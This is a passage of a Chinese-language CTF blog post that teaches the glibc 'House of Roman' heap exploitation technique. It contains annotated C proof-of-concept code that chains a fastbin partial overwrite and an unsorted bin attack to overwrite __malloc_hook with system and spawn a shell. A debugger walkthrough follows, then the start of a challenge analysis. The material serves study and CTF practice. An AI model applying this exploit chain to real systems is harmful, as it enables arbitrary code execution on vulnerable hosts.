<span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们在修改之前需要填充物</span></span><br><span class="line"><span class="comment">// 为了让程序正常工作,fd指针对应的位置必须要有一个指针. </span></span><br><span class="line"><span class="comment">// 释放这个堆块会将一个堆块放入 fastbin_victim 的 fd 对应位置中，以便稍后使用。</span></span><br><span class="line"><span class="built_in">free</span>(relative_offset_heap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    在这个chunk上创建一个UAF漏洞. 回忆一下fastbin_victim指向的chunk,当前偏移为0x190(heap_relative_offset).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">现在, 我们开始进行相对地址修改, 因为我们有指针指向恰当的位. 现在堆布局非常重要,我们先来理解堆布局.</span></span><br><span class="line"><span class="comment">当前的堆布局如下: </span></span><br><span class="line"><span class="comment">0x0:   fastbin_victim       - size 0x70 </span></span><br><span class="line"><span class="comment">0x70:  alignment_filler     - size 0x90</span></span><br><span class="line"><span class="comment">0x100: fake_libc_chunk      - size 0x70</span></span><br><span class="line"><span class="comment">0x170: leftover_main        - size 0x20</span></span><br><span class="line"><span class="comment">0x190: relative_offset_heap - size 0x70 </span></span><br><span class="line"><span class="comment">bins链表的布局如下: </span></span><br><span class="line"><span class="comment">fastbin:  fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">unsorted: leftover_main</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">现在, 相对地址修改开始:</span></span><br><span class="line"><span class="comment">回忆一下,fastbin_victim指向的是relative_offset_heap </span></span><br><span class="line"><span class="comment">(且该位置的偏移范围在0x100-0x200之间). fastbin使用一个简单的链表, </span></span><br><span class="line"><span class="comment">下一个chunk的地址,是在当前chunk的fd指针范围内.</span></span><br><span class="line"><span class="comment">通过 *部分地* 编辑fastbin_victim的最后一字节(从0x90 到 0x00) </span></span><br><span class="line"><span class="comment">我们已经移动fastbin_victim的fd指针到fake_libc_chunk中(偏移0x100).</span></span><br><span class="line"><span class="comment">此外, 我们回忆一下fake_libc_chunk先前已经处于unsorted_bin中. </span></span><br><span class="line"><span class="comment">由于fake_libc_chunk已经处于unsorted_bin中, 它的fd指针是指向main_arena + 0x68的位置. </span></span><br><span class="line"><span class="comment">现在, fastbin这个链表主要看起来如下: </span></span><br><span class="line"><span class="comment">fastbin_victim -&gt; fake_libc_chunk -&gt;(main_arena + 0x68).</span></span><br><span class="line"><span class="comment">相对偏移地址修改(在上面被提到的这个方法) 将在下面被一步一步展现出来</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">修改堆块的第一个字节为了将fastbin chunk执行带有Libc地址的chunk\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fastbin 0x70现在看起来像这样:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// 此时fastbin_victim[0]这个位置在0x100偏移, 并且我们只想要修改第一个字节.所以我们放置0x0到这边.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">现在, 我们的fastbin布局如下: </span></span><br><span class="line"><span class="comment">0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (main_arena + 0x68)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">我们想要使得在fake_libc_chunk中的fd指针指向一些有用的位置. </span></span><br><span class="line"><span class="comment">因此, 让我们修改这个位置,使其指向 __malloc_hook所处的位置. </span></span><br><span class="line"><span class="comment">这样, 我们就能控制一个函数指针.</span></span><br><span class="line"><span class="comment">为了达到这个目的, 我们需要一个有效的malloc size位. 在__memalign_hook中</span></span><br><span class="line"><span class="comment">通常由一个0x7f开头的地址. </span></span><br><span class="line"><span class="comment">因为__memalign_hook的值在该地址前都是0(也就是这个地址的前面位置都存储着0), </span></span><br><span class="line"><span class="comment">我们使用错位技巧使得__memalign_hook这边的fake_chunk因为有效的size位在0x70 fastbin中从而正常工作 .</span></span><br><span class="line"><span class="comment">这就是第一个4位随机性发生的地方. </span></span><br><span class="line"><span class="comment">Libc地址的第一个12 bit是具有确定性的. </span></span><br><span class="line"><span class="comment">然而, 接下来的4位(总共2字节中的一部分)是随机的.</span></span><br><span class="line"><span class="comment">    0x7f1234 a 000  </span></span><br><span class="line"><span class="comment">0x7f1234 b 000</span></span><br><span class="line"><span class="comment">0x7f1234 c 000</span></span><br><span class="line"><span class="comment">(这边的a、b、c就表示接下来的4位,这一位具有不确定性)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">因此, 我们必须爆破16中不同的可能</span></span><br><span class="line"><span class="comment">为了得到正确的位置. </span></span><br><span class="line"><span class="comment">这个&#x27;位置&#x27;在每一个GLibc版本都是不同的(这里应该划一个重点).</span></span><br><span class="line"><span class="comment">在进行相对地址修改之后, fastbin的布局如下:</span></span><br><span class="line"><span class="comment">0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">相对得修改main_arena指针,使其指向一个有效的chunk,并且这个chunk靠近__malloc_hook.</span></span><br><span class="line"><span class="comment">///// 注意: 为了使得利用连续 </span></span><br><span class="line"><span class="comment">(也就是不爆破硬编码的偏移量), 我们手动设置这个值(模拟我们爆破成功). \\\</span></span><br><span class="line"><span class="comment">在实际的攻击中, 这些值需要时一个特定版本(高版本libc中hook全被删了)并且一些bit位一定是需要爆破的</span></span><br><span class="line"><span class="comment">(这取决于bits).</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">在fastbin中对main_arena pointer使用一个相对地址修改的方法在.\n\</span></span><br><span class="line"><span class="string">使得fd指针指向__malloc_hook附近的位置,这样的目的是创造一个fake fastbin chunk\n&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// 我们从malloc减去0x23因为我们想要使用0x7f作为一个有效的fastbin chunk的size位.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 相对地址修改</span></span><br><span class="line"><span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; </span><br><span class="line"><span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// 地址的最低有效字节数.</span></span><br><span class="line">fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// 这一部分的最高4位必须在实际攻击中通过暴力破解.</span></span><br><span class="line"><span class="comment">// 在fastbin中，__malloc_hook块之前有两个填充块。 </span></span><br><span class="line"><span class="comment">// 它们是 fastbin_victim 和 fake_libc_chunk。.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;得到指向__malloc_hook附近的fake chunk\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">在一个真实的利用中, 这将会有15/16的概率失败\n\</span></span><br><span class="line"><span class="string">因为最后malloc_hook最后的半字节是随机的\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果4位的爆破没有成功,这就会导致程序崩溃 </span></span><br><span class="line"><span class="comment">// 因为chunk的size位与bin中存储chunk的大小不匹配. </span></span><br><span class="line"><span class="comment">// 爆破成功接下去的攻击步骤就可以开始.</span></span><br><span class="line"><span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Passed step 1 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第二部分: Unsorted_bin attack </span></span><br><span class="line"><span class="comment">现在，我们已经控制了__malloc_hook的位置。然而，我们仍然不知道LibC的地址。</span></span><br><span class="line"><span class="comment">因此，我们无法通过这个攻击做太多事情。为了获得一个shell，我们需要获取__malloc_hook位置的地址。</span></span><br><span class="line"><span class="comment">我们将使用未排序的bin攻击来更改__malloc_hook的值，将其设置为main_arena + 0x68的地址。</span></span><br><span class="line"><span class="comment">有关未排序bin攻击的更多信息，请查看 </span></span><br><span class="line"><span class="comment">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.</span></span><br><span class="line"><span class="comment">简要概述，未排序bin攻击允许我们通过改变一个未排序bin块的chunk-&gt;bk，</span></span><br><span class="line"><span class="comment">将main_arena + 0x68写入到任何位置。我们将选择将其写入__malloc_hook的位置.</span></span><br><span class="line"><span class="comment">在我们用main_arena覆盖__malloc_hook后，</span></span><br><span class="line"><span class="comment">我们将编辑指针（通过相对覆盖）使其指向一个one_gadget以实现立即执行代码。.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">再次强调，这个相对覆盖工作得很好，但需要额外的1字节（8位）暴力破解。</span></span><br><span class="line"><span class="comment">这将使成功的尝试几率增加到12位的随机性。大约有1/4096或0.0244%的概率会成功。</span></span><br><span class="line"><span class="comment">攻击的第二阶段步骤如下所述。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Start Step 2: Unsorted_bin attack\n\nThe unsorted bin attack 使我们能够将一个较大的值写入任何位置\n但我们无法控制该值\n这个值始终是 main_arena + 0x68. \n我们将unsorted_bin attack指向 __malloc_hook，以便稍后进行相对覆盖.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使得这个chunk腐败. 添加另一个指针以防止在释放时合并。.</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// 防止合并</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;放置chunk到unsorted_bin\n&quot;</span>);</span><br><span class="line"><span class="comment">// 释放这个堆块构造UAF漏洞</span></span><br><span class="line"><span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* /// 注意: 字节2的最后4位之前已经被暴力破解过了. </span></span><br><span class="line"><span class="comment"> 但是，为了举例说明，这里是动态计算的。. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// 之所以需要减去0x10,是因为chunk-&gt;fd在unsorted_bin attack中执行了实际的覆盖操作.</span></span><br><span class="line">byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; </span><br><span class="line">byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用另一个相对偏移来覆盖 chunk-&gt;bk 指针的指针。</span></span><br><span class="line"><span class="comment">// 从之前的暴力破解（前面提到的 4 位）中，我们知道它的位置。它距离 __malloc_hook 有 5 个字节</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;覆盖该块的最后两个字节，使其指向 __malloc_hook.\n&quot;</span>);</span><br><span class="line">unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// //// 注意: 通常情况下，字节的后半部分需要通过爆破来确定。不过，为了方便演示，我们特意设置了这个值，以确保利用过程的稳定性. ///</span></span><br><span class="line">unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// bk 指针的第一个字节，其中后4位是之前通过爆破确定的，而前4位是固定的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">触发 unsorted bin 攻击。</span></span><br><span class="line"><span class="comment">这将把 (main_arena + 0x68) 的值写入 bk 指针指向的位置加上 0x10 的地址。</span></span><br><span class="line"><span class="comment">在此过程中会发生以下几件事：: </span></span><br><span class="line"><span class="comment">- 这会导致 unsorted bin（以及 small bin 和 large bin）变得不可用。</span></span><br><span class="line"><span class="comment">  因此，之后只能使用 fastbin 中已有的内存块。</span></span><br><span class="line"><span class="comment">- 如果之后未分配与 unsorted bin 攻击块相同大小的内存块，程序会立即崩溃。</span></span><br><span class="line"><span class="comment">  因此，接下来的分配请求必须与 unsorted bin 攻击块的大小一致。</span></span><br><span class="line"><span class="comment">第一个问题在本次攻击中完全没问题，但在更复杂的程序中可能会带来麻烦.</span></span><br><span class="line"><span class="comment">第二个问题只要求我们进行与当前块相同大小的分配即可.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;触发unsorted_bin attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// 触发 unsorted bin 攻击，将 __malloc_hook 覆盖为 main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)dlsym(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Passed step 2 =)\n\n\n&quot;</span>);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Step 3: Set __malloc_hook to system</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">该 chunk 本身距离 __malloc_hook 偏移 19 个字节. </span></span><br><span class="line"><span class="comment">因此，我们再次使用相对覆盖的方式，部分覆盖 main_arena 指针（来自 unsorted bin 攻击）以使其指向 system.</span></span><br><span class="line"><span class="comment">在真实攻击中，前 12 位是静态的（取决于 glibc 版本），但接下来的 12 位必须通过暴力破解来确定. </span></span><br><span class="line"><span class="comment">/// 注意: 为了举例说明，我们将直接设置这些值，而不是通过暴力破解来确定. \\\</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 3: 将 __malloc_hook 设置为 system / one_gadget\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">现在我们在 __malloc_hook 中拥有指向 LibC 的指针（来自第 2 步）, \n\</span></span><br><span class="line"><span class="string">我们可以使用相对覆盖将其指向 system 或 one_gadget.\n\</span></span><br><span class="line"><span class="string">注意：在真实攻击中，这将是最后 8 位蛮力破解的来源\n&quot;</span>);</span><br><span class="line">malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// 前 12 位是静态的（每个版本都相同）。.</span></span><br><span class="line"></span><br><span class="line">malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// 最后 4 位必须通过暴力破解（已经在之前完成）.</span></span><br><span class="line">malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// 最后一个字节是剩余的 8 位，必须通过暴力破解.</span></span><br><span class="line">malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// 如果数据段和文本段之间的间隙非常大，也需要这样做。只是为了安全起见添加这一步。.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发 malloc 调用，通过 __malloc_hook 中运行的系统调用来执行代码.</span></span><br><span class="line"><span class="comment">// 在一个实际的例子中，你可能想使用 one_gadget. </span></span><br><span class="line"><span class="comment">// 但是，为了保持移植性，我们将直接使用 system，并将指向 /bin/sh 的指针作为参数</span></span><br><span class="line"><span class="comment">// 虽然这有点作弊（因为二进制文件是 PIE），如果二进制文件不是 PIE，拥有指向 .bss 区段的指针将能在没有任何泄漏的情况下工作. </span></span><br><span class="line"><span class="comment">// 为了获取 system 地址（为了保持一致性），二进制文件必须是 PIE。因此，地址被放在这里.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Pop Shell!&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="利用与调试"><a class="markdownIt-Anchor" href="#利用与调试"></a> 利用与调试</h2><ul><li>接下来我们来进行程序的调试，并且画图来查看一下<code>house of roman</code>是如何进行利用的。我们这边就先简单介绍一下这四个堆块的作用<ul><li>我们申请的第一个堆块是为了进行<code>UAF</code>漏洞的利用<code>malloc(0x60)</code></li><li>我们申请的第二个堆块是为了第三次申请的堆块的起始地址与<code>0x100</code>对齐</li><li>申请第三个堆块，其被命名为<code>main_arena_use</code>，这个堆块之后会被释放，释放后会被放入<code>unsorted_bin</code></li><li>申请第四个堆块，其被命名为<code>relative_offset_heap</code>，这个堆块的作用就是用来写相对地址的</li></ul></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408084114209.png" alt="image-20250408084114209"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408091207798.png" alt="image-20250408091207798"></p><ul><li>然后我们将我们第三次申请堆块即<code>main_arena_use</code>释放掉，这样该堆块就会被放入<code>unsortedbin</code>中</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408090721077.png" alt="image-20250408090721077"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408091222792.png" alt="image-20250408091222792"></p><ul><li>在释放第三个堆块之后，我们再使用<code>malloc</code>申请一个堆块，这个堆块的<code>size</code>位必须为<code>0x70</code>，这样我们才能将这个堆块通过<code>fasbtin_attack</code>从而申请到<code>malloc_hook</code>附近的堆块。</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408091026482.png" alt="image-20250408091026482"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408092743872.png" alt="image-20250408092743872"></p><ul><li>此时我们将<code>chunk3</code>和<code>chunk0</code>，此时堆块的结构如下：</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408092707725.png" alt="image-20250408092707725"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408092945766.png" alt="image-20250408092945766"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408093036195.png" alt="image-20250408093036195"></p><ul><li>这时我们通过<code>UAF</code>或者<code>堆溢出</code>的方式去修改<code>fastbin_victim</code>的fd指针，使其指向<code>fake_libc_chunk</code>而此时<code>fake_libc_chunk</code>这个堆块在之前我们将其申请来的时候并没有将其<code>fd</code>、<code>bk</code>指针设置为<code>0</code>或者填入其他垃圾数据，这样<code>fastbin</code>就形成了一个<code>fastbin_victim--&gt;fake_libc_chunk--&gt;unsorted_bin</code>这样的一个链表。</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408120712312.png" alt="image-20250408120712312"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408120827499.png" alt="image-20250408120827499"></p><ul><li>这时我们需要修改<code>fake_libc_chunk</code>的最后<code>16</code>位使其指向<code>__malloc_hook -0x23</code>。此时由于内存分页机制，最后<code>12</code>位是固定的，在这里我们还需要爆破<code>4</code>位。在这个实验中，我们就直接修改成正确的地址。此时这边<code>fake_chunk</code>的<code>size</code>位为<code>0x7f</code>，这时我们在使用<code>malloc</code>从fastbin中将这个地址申请给用户的时候，就可以绕过对<code>size</code>位的检查。</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408121424283.png" alt="image-20250408121424283"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408121453349.png" alt="image-20250408121453349"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408121404821.png" alt="image-20250408121404821"></p><ul><li>这样构造之后，我们再连续调用三次<code>malloc(0x60)</code>，在第三次调用<code>malloc(0x60)</code>时，其返回的地址就是在<code>__malloc_hook</code>附近。</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408121836624.png" alt="image-20250408121836624"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408121851994.png" alt="image-20250408121851994"></p><ul><li>此时我们的堆布局是这样的</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408122213350.png" alt="image-20250408122213350"></p><ul><li>这时我们就可以对劫持<code>malloc_hook</code>这个函数指针了，虽然我们能控制这个<code>hook</code>函数指针，但是我们不知道<code>libc</code>的地址，没办法写入<code>system</code>之类的地址，这时我们就需要进行第二步操作，先申请一个堆块<code>malloc(0x80)</code>，这个堆块就用于<code>unsorted_bin_attack</code>的利用，此时我们还需要再申请一个堆块<code>malloc(0x30)</code>，防止我们申请的<code>0x80</code>的那个堆块在释放后与<code>top_chunk</code>合并。</li><li>此时我们的堆块布局如下：</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408122508938.png" alt="image-20250408122508938"></p><ul><li>然后我们释放掉上图红色框部分中<code>size</code>位为<code>0x91</code>的堆块，此时它就会被放入<code>unsorted_bin</code>中。</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408122617958.png" alt="image-20250408122617958"></p><ul><li>由于前面我们已经爆破出了<code>malloc_hook</code>附件的地址，此时我们再劫持<code>bk</code>指针到<code>malloc_hook</code>附近就比较简单。此时我们修改这个堆块的<code>bk</code>指针</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408123206743.png" alt="image-20250408123206743"></p><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408123225072.png" alt="image-20250408123225072"></p><ul><li>接下来就出发<code>unsorted_bin</code>攻击，将<code>__malloc_hook</code>的值修改为<code>main_arena+88</code>这个位置</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408123529660.png" alt="image-20250408123529660"></p><ul><li>劫持到之后我们就需要进行爆破操作，现在先来看一看<code>system</code>函数的地址将该地址与<code>main_arena+88</code>这个地址做比较。</li><li>发现<code>main_arena+88 = 0x00007fb11e321b78</code>、<code>system =  0x7fb11dfa23a0</code>，此时<code>system</code>函数地址最小的<code>12</code>位是固定的，此时<code>0x7fb11****XX</code>，此时我们最后从小到大<code>第12-16位</code>已经在前面被爆破出来的，所以相当于已知<code>0x7fb11***XXX</code>，此时我们就还需要爆破<code>12</code>位的地址。</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408123651198.png" alt="image-20250408123651198"></p><ul><li>爆破出来后就<code>malloc_hook</code>中的数据就变成如下：</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408124235627.png" alt="image-20250408124235627"></p><ul><li>最后我们再申请一个<code>malloc(sh_addr)</code>这样就可以执行<code>system(&quot;/bin/sh&quot;)</code>。最终<code>getshell</code></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250408124414060.png" alt="image-20250408124414060"></p><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><ul><li>主要就是利用<code>fastbin attack</code>使得我们能申请到<code>malloc_hook</code>附近的内存空间，从而可以对<code>malloc_hook</code>这个写入数据</li><li>之后利用<code>unsortedbin attack</code>使得我们能修改<code>malloc_hook</code>的值为<code>main_arena+88</code>，之后利用<code>fastbin attack</code>申请到的重新写入和爆破部分位的地址，这样我们就能<code>getshell</code>了。</li></ul><h1 id="house_of_roman_level1"><a class="markdownIt-Anchor" href="#house_of_roman_level1"></a> house_of_roman_level1</h1><ul><li>接下来我们来看一题，加深一下<code>house of roman</code>这个组合技的使用。接下来我们先运行一下这个程序。首先这个程序会出现一个菜单</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409081325696.png" alt="image-20250409081325696"></p><ul><li>对于选项<code>1</code>我们需要进行如下输入</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409081358481.png" alt="image-20250409081358481"></p><ul><li>对于选项<code>2</code></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409081549584.png" alt="image-20250409081549584"></p><ul><li>对于选项<code>3</code></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409081626806.png" alt="image-20250409081626806"></p><h2 id="level_1分析1"><a class="markdownIt-Anchor" href="#level_1分析1"></a> level_1分析1</h2><ul><li>我们再查看一下保护机制，发现保护全开，但是符号表没有被去除。</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409081732400.png" alt="image-20250409081732400"></p><ul><li>现在我们使用<code>IDA</code>打开这个程序。查看<code>main</code>函数，发现main函数主要就是起到一个<code>菜单的作用</code></li></ul><p><img 